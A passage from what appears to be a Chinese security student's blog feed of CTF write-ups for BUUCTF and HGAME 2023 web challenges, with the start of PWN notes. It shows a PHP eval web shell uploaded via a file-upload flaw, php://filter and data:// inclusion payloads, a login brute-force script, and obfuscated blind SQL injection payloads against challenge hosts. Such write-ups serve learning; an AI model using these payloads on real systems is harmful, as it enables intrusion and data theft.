<span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="comment">//遍历$_GET数组中的键值对，检查如果GET参数flag的值等于某个键名，并且该键名不等于&quot;flag&quot;本身</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">第一次迭代：</span></span><br><span class="line"><span class="comment">$x = 1 , $y = flag</span></span><br><span class="line"><span class="comment">$_GET[&#x27;flag&#x27;] = 1</span></span><br><span class="line"><span class="comment">这里的$x的类型是string，而$_GET[&#x27;flag&#x27;]的值的类型是int，故不完全相等从而绕过,并且flag变量的内容没有被修改过！</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">......</span></span><br><span class="line"><span class="comment">最后成功</span></span><br><span class="line"><span class="comment">echo &quot;the flag is: &quot;.$flag;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="易错总结："><a href="#易错总结：" class="headerlink" title="易错总结："></a>易错总结：</h3><ol><li><p><code>$x</code>与<code>$_GET[X]</code>要分辨清楚！</p></li><li><p>URL请求中的问号问题：<img lazyload alt="image" data-src="D:\Typora\typora-user-images\image-20230526193753213.png"></p></li></ol><h2 id="0x3-BJDCTF2020-ZJCTF，不过如此"><a href="#0x3-BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="0x3:[BJDCTF2020]ZJCTF，不过如此"></a>0x3:[BJDCTF2020]ZJCTF，不过如此</h2><h3 id="初探题目-1"><a href="#初探题目-1" class="headerlink" title="初探题目"></a>初探题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​    我在思考如何绕过<code>file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;</code>,因为我不知道哪个路径下的文件它的内容是<code>I have a dream</code></p><hr><p>​    今日内容到这里~~</p><p>​    但求坚持！</p><hr><p>​    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230527/St2iv8rimage.5lb2d8e0ntw0.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,I have a dream</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;<span class="comment">//目的是为了在会话中保留 $id 值，以备后续的操作使用。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;<span class="comment">//re:regular expression</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">一、&#x27;/&#x27; 是正则表达式的分隔符，&quot;()&quot; 表示捕获分组</span></span><br><span class="line"><span class="comment">二、ei 是修饰符，其中 e 表示替换字符串作为 PHP 代码进行执行，i 表示匹配不区分大小写。</span></span><br><span class="line"><span class="comment">字符串连接运算符&#x27;.&#x27;将字符串 &#x27;(&#x27; $re 和 &#x27;)&#x27; 连接在一起，形成一个完整的正则表达式模式。</span></span><br><span class="line"><span class="comment">如果 $re 的值是 &#x27;abc&#x27;，那么字符串连接运算符将产生 &#x27;(abc)&#x27;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补充知识：</p><ol><li><p>在正则表达式中，括号具有特殊的含义，并用于多种目的。以下是常见的括号用法：</p><p>​    捕获组 <code>( )</code>：括号可以用于创建捕获组，将匹配的子字符串提取出来以供后续引用或处理。</p><p>​        例如，正则表达式 <code>(abc)+</code> 中的 <code>(abc)</code> 是一个捕获组，表示匹配连续出现的 “abc” 子字符串。</p><p>​    非捕获组 <code>(?: )</code>：括号前加上 <code>?:</code>，可以创建非捕获组，用于匹配但不捕获匹配的内容。</p><p>​        例如，正则表达式 <code>(?:abc)+</code> 中的 <code>(?:abc)</code> 是一个非捕获组，表示匹配连续出现的 “abc” 子字符串，但        不捕获它们。</p><p>​    分组和顺序 <code>( )</code>：括号可以用于分组和确定匹配的顺序。</p><p>​        例如，正则表达式 <code>(abc|def)</code> 表示匹配 “abc” 或 “def”。</p></li><li><p><code>(abc)+</code> 表示匹配连续出现的 “abc” 子字符串，其中括号 <code>(abc)</code> 表示捕获组，<code>+</code> 表示前面的捕获组可以出现一次或多次。</p><p>​    例如，该正则表达式可以匹配 “abc”、”abcabc”、”abcabcabc” 等连续出现多次的 “abc” 子字符串。</p><p>​    <strong>不会匹配单个的 “abc”</strong>，因为 <code>+</code> 要求前面的元素至少出现一次。</p></li><li><p><code>strtolower(&quot;\\1&quot;)</code> 是一个 PHP 的函数调用，用于将字符串转换为小写字母形式。</p><ul><li><code>strtolower()</code> 是一个 PHP 内置函数，用于<strong>将字符串转换为小写字母形式</strong>。</li><li><code>\\1</code> 是一个转义序列，表示要引用正则表达式中第一个捕获组的匹配结果。</li><li>在这个表达式中，<code>strtolower(&quot;\\1&quot;)</code> 的作用是将正则表达式中第一个捕获组的匹配结果转换为小写字母形式。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUU刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023hgamectf</title>
      <link href="/2023/02/05/0_PWN/2023hgamectf/"/>
      <url>/2023/02/05/0_PWN/2023hgamectf/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Web like high sky  , Pwn like deep sea .</p></blockquote><span id="more"></span><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-Classic-Childhood-Game"><a href="#1-Classic-Childhood-Game" class="headerlink" title="1.Classic Childhood Game"></a>1.Classic Childhood Game</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.2s20ylq8l48w.webp"></p><p>​    打开网站发现是一个游戏，我的思路有下：</p><ol><li>修改分数类型。</li><li>藏在源码类型。</li><li>源码中有隐藏函数，找到该函数，放在console中执行类型。</li></ol><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.34fvdqk9vsw0.webp"></p><p>查看源码发现了一个解密函数<code>mota()</code>，在console中运行得到flag。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.17w2gm24rlgg.webp"></p><p>发现一个好玩的网站：<a class="link" href="https://cyberchef.cn/">cyberchef<i class="fas fa-external-link-alt"></i></a>，直接解码得到flag。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.6m8tldhv8eio.webp"></p><h2 id="2-Become-A-Member"><a href="#2-Become-A-Member" class="headerlink" title="2.Become A Member"></a>2.Become A Member</h2><blockquote><p>学校通知放寒假啦，兔兔兴高采烈的打算购买回家的车票，这时兔兔发现成为购票网站的会员账户可以省下一笔money…… 想成为会员也很简单，只需要一点点HTTP的知识……等下，HTTP是什么，可以吃吗?</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 请先提供一下身份证明（Cute-Bunny）哦</span><br><span class="line">User-Agent: Cute-Bunny</span><br><span class="line"># 每一个能够成为会员的顾客们都应该持有名为Vidar的邀请码（code）</span><br><span class="line">Cookie: code=Vidar</span><br><span class="line"># 由于特殊原因，我们只接收来自于bunnybunnybunny.com的会员资格申请</span><br><span class="line">Referer: bunnybunnybunny.com</span><br><span class="line"># 就差最后一个本地的请求，就能拿到会员账号啦</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.7g0wbyz9iruo.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.4ttazxhd4k5c.webp"></p><h2 id="3-Guess-Who-I-Am"><a href="#3-Guess-Who-I-Am" class="headerlink" title="3.Guess Who I Am"></a>3.Guess Who I Am</h2><blockquote><p>刚加入Vidar的兔兔还认不清协会成员诶，学长要求的答对100次问题可太难了，你能帮兔兔写个脚本答题吗？</p></blockquote><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.53vjyq5roohs.webp"></p><p>打开源码，发现<code>Hint</code></p><p>输入该文档对应的id，对应正确则Score++</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.1br74mg4m23k.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.16ei54k72grk.webp"></p><p>​    根据题目说明，当<code>score&gt;=100</code>会输出flag。</p><p>​    写个脚本，成功得到flag：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.30cki5fxsf0g.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">answer= [hint页信息]</span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="comment"># 保持会话</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    getscore = <span class="string">&quot;http://week-1.hgame.lwsec.cn:30010/api/getScore&quot;</span></span><br><span class="line">    <span class="comment"># 获取分数 GET</span></span><br><span class="line">    getquestion = <span class="string">&#x27;http://week-1.hgame.lwsec.cn:30010/api/getQuestion&#x27;</span></span><br><span class="line">    <span class="comment"># 提问信息 GET</span></span><br><span class="line">    verifyanswer = <span class="string">&quot;http://week-1.hgame.lwsec.cn:30010/api/verifyAnswer&quot;</span></span><br><span class="line">    <span class="comment"># 答题 POST</span></span><br><span class="line">    r1 = s.get(getscore)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hgame&quot;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">        <span class="built_in">print</span>(r1.json()[<span class="string">&quot;message&quot;</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 最后打印flag</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r2 = s.get(getquestion)</span><br><span class="line">        data1 = r2.json()</span><br><span class="line">        find_id=data1[<span class="string">&quot;message&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> answer:</span><br><span class="line">            <span class="keyword">if</span> find_id <span class="keyword">in</span> j.values():</span><br><span class="line">                <span class="built_in">id</span> = j[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>:<span class="built_in">id</span>&#125;</span><br><span class="line">        r3 = s.post(verifyanswer,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Correct answer!&quot;</span> <span class="keyword">in</span> r3.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>次正确&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="4-Show-Me-Your-Beauty"><a href="#4-Show-Me-Your-Beauty" class="headerlink" title="4.Show Me Your Beauty"></a>4.Show Me Your Beauty</h2><blockquote><p>登陆了之前获取的会员账号之后，兔兔想找一张自己的可爱照片，上传到个人信息的头像中 :D 不过好像可以上传些奇怪后缀名的文件诶 XD</p></blockquote><p><code>文件上传</code></p><p>这道题难度不大，让我很好地回忆了文件上传类题目。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;b&#x27;])?&gt;</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.5cc3qg06awzk.webp"></p><p>剑蚁连接</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.1n19hkwmzfcw.webp"></p><p>得到flag</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.3n05ae4vtio0.webp"></p><h2 id="5-Git-Leakage"><a href="#5-Git-Leakage" class="headerlink" title="5.Git Leakage"></a>5.Git Leakage</h2><blockquote><p>电视剧里的黑客?真正的黑客！</p></blockquote><p>​    题目还挺炫酷的，题目提示，使用<code>GitHack</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.1lhttixd9s68.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.31p7l6ffy60w.webp"></p><p>用记事本打开下载到的文件<code>Th1s_1s-flag</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.3wekfqh4nzb4.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.3z35si9dzz28.webp"></p><h3 id="6-v2board"><a href="#6-v2board" class="headerlink" title="6.v2board"></a>6.v2board</h3><blockquote><p>请尝试获取Admin用户的订阅链接，flag格式为hgame{admin用户订阅链接中的token值}。</p></blockquote><p>随便注册一个账号，登陆时候<code>burp</code>抓包，回报报文：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.6r7foqrscpog.webp"></p><p>参考这篇博文：<a class="link" href="http://wiki.peiqi.tech/wiki/webapp/V2Board/V2Board%20Admin.php%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html">v2board漏洞<i class="fas fa-external-link-alt"></i></a></p><h2 id="7-Search-Commodity"><a href="#7-Search-Commodity" class="headerlink" title="7.Search Commodity"></a>7.Search Commodity</h2><blockquote><p>R1esbyfe给兔兔写了一个简易的查询面板，只需要输入id数字，就可以查到兔兔最近买的东西（包括年货） R1esbyfe:”面板登陆用户名是user01,密码……忘了，反正是个比较好猜的密码” 貌似R1esbyfe还藏了点惊喜，你能帮助兔兔找到它吗？ (数据库启动需要时间，若出现Internal Error，需要稍等片刻)</p><p>HINTS:</p><p>密码是弱密码，可以自己找个dict爆破一下</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://week-2.hgame.lwsec.cn:30157/login&quot;</span></span><br><span class="line">    dic = <span class="built_in">open</span>(<span class="string">&quot;D:\\桌面\\dic.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        req = requests.post(url, data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;user01&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: i</span><br><span class="line">        &#125;).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Login Failed&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(n,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;失败&#x27;</span>)</span><br><span class="line">            n = n+<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.6jx11tsbsnb4.webp"></p><p>密码为<code>admin123</code></p><p>SESSION:<code>MTY3NjI5ODQ1NHxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT185BEJlWrGICqjjLJ6-FuHpARovClYOXGJmlKv7-KmpIs=</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.1tpf0sji5lj4.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.43ohcls3a6ps.webp"></p><p>​    编写了一个脚本，用于探测语句被过滤的情况：<mark>(待查看)</mark></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://week-2.hgame.lwsec.cn:30157/search&quot;</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    trytxt = <span class="string">&quot;0/*a*/UNion/*a*/SELECt/*a*/1,group_Concat(name),1/*a*/frOm/*a*/information_schema.tables/*a*/whEre/*a*/table_schema/*a*/LiKe/*a*/datAbase()#&quot;</span></span><br><span class="line">    curr_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> curr_index &gt;= <span class="built_in">len</span>(trytxt):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i = <span class="built_in">ord</span>(trytxt[curr_index])</span><br><span class="line">        ret = requests.post(url, data=&#123;</span><br><span class="line">            <span class="string">&#x27;search_id&#x27;</span>: <span class="string">&#x27;if(ascii(substr(&quot;%s&quot;, %s, 1))-%s, 1, 0)  #&#x27;</span> % (trytxt, index + <span class="number">1</span>, i)</span><br><span class="line">        &#125;, headers=&#123;</span><br><span class="line">            <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;SESSION=MTY3NjI5ODQ1NHxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT185BEJlWrGICqjjLJ6-FuHpARovClYOXGJmlKv7-KmpIs=&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;hard disk&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.text:</span><br><span class="line">            s += <span class="built_in">chr</span>(i)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">        curr_index += <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0/*a*/UNion/*a*/SELECt/*a*/1,group_Concat(table_name),1/*a*/frOm/*a*/infOrmation_schema.tables/*a*/whEre/*a*/table_schema/*a*/LiKe/*a*/datAbase()#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0/*a*/UNion/*a*/SELECt/*a*/1,group_Concat(column_name),1/*a*/frOm/*a*/infOrmation_schema.columns/*a*/whEre/*a*/table_name/*a*/LiKe/*a*/&#x27;5ecret15here&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0/*a*/UNion/*a*/SELECt/*a*/1,group_Concat(f14gggg1shere),1/*a*/frOm/*a*/5ecret15here#</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.48zi2qquby2o.webp"></p><p>参考wp: <a class="link" href="https://blog.csdn.net/vvbbnn00/article/details/128721089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167629589916800211554804%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167629589916800211554804&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-128721089-null-null.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=hgame2023&spm=1018.2226.3001.4187">wp<i class="fas fa-external-link-alt"></i></a></p><p>DLP helps to classify and tag data securely and flags unusual activity around it</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-PWN刷题笔记</title>
      <link href="/2023/01/17/BUU-PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%E2%91%A0/"/>
      <url>/2023/01/17/BUU-PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%E2%91%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>Well begun is half done.</code></p></blockquote><span id="more"></span><h1 id="BUU-PWN刷题笔记"><a href="#BUU-PWN刷题笔记" class="headerlink" title="BUU-PWN刷题笔记"></a>BUU-PWN刷题笔记</h1><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221226175437031.534yw6j44a2o.webp"></p><p>（这么可爱的刷题网站，这还不刷？？？！！！）</p><h2 id="0x0"><a href="#0x0" class="headerlink" title="0x0"></a>0x0</h2><p>签到</p><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>ret2text</p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221226194855385.4d4ve3gqsj5s.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221226194952701.62vsmrp0e7eo.webp"></p><p>没啥意义，ret2text。</p><p>倒是学习了一下C语言的write函数和sprintf函数</p><p><a class="link" 